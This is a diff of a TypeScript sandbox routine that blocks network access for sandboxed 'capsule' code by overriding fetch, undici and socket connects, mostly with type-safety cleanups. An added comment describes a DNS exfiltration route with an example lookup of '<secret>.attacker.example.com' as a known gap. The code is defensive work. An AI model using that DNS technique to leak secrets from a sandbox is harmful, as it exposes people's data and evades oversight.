@@ -29,9 +29,11 @@ async function installNetworkRestriction() {
   }
   ;(globalThis as any).fetch = denyFetch
   try {
-    // @ts-ignore — undici may not be available
-    const undici: any = await import("undici")
-    if (undici && typeof undici === "object") undici.fetch = denyFetch
+    // undici may not be installed and has no bundled types here; use a
+    // string-built specifier so tsc doesn't try to resolve it.
+    const specifier = "undici"
+    const undici = (await import(specifier)) as { fetch?: unknown }
+    if (undici && typeof undici === "object") (undici as { fetch?: unknown }).fetch = denyFetch
   } catch {
     // undici may not be installed; best-effort
   }
@@ -41,31 +43,32 @@ async function installNetworkRestriction() {
   // "one line of node:https" to "you have to ship native code."
   try {
     const net = await import("node:net")
-    const origConnect = net.Socket.prototype.connect
-    net.Socket.prototype.connect = function (...args: any[]) {
+    net.Socket.prototype.connect = function (...args: unknown[]) {
       const a0 = args[0]
       let host = ""
       let port: number | string = ""
       if (typeof a0 === "object" && a0 !== null) {
-        // IPC unix socket path is allowed only if the path is inside cwd (deploy dir);
-        // for safety just block all paths too.
-        if (typeof a0.path === "string") {
-          throw new Error(`${denyMsg} (unix socket: ${a0.path})`)
+        const obj = a0 as { path?: unknown; host?: unknown; address?: unknown; port?: unknown }
+        if (typeof obj.path === "string") {
+          throw new Error(`${denyMsg} (unix socket: ${obj.path})`)
         }
-        host = String(a0.host ?? a0.address ?? "")
-        port = a0.port
+        host = String(obj.host ?? obj.address ?? "")
+        port = typeof obj.port === "number" || typeof obj.port === "string" ? obj.port : ""
       } else if (typeof a0 === "number" || typeof a0 === "string") {
         port = a0
         if (typeof args[1] === "string") host = args[1]
       }
       throw new Error(`${denyMsg} (attempted connect to ${host || "<unspecified>"}:${port})`)
-      // unreachable; keeps origConnect reference live for the linter
-      // @ts-ignore
-      return origConnect.apply(this, args)
     }
   } catch {
     // node:net should always be available; best-effort
   }
+  // Note on DNS: a capsule can still leak data via dns.lookup("<secret>.attacker.example.com")
+  // even with net.Socket.connect blocked, because the resolver query leaves the host
+  // before any TCP connect. JS-level patching of node:dns is unreliable across Node
+  // versions and under --experimental-permission, so DNS exfiltration must be closed
+  // at the OS layer (cgroups, network namespaces, egress firewall). This is a known
+  // gap of the JS-only sandbox.
 }
 
 process.on("message", async (msg: ParentMessage) => {
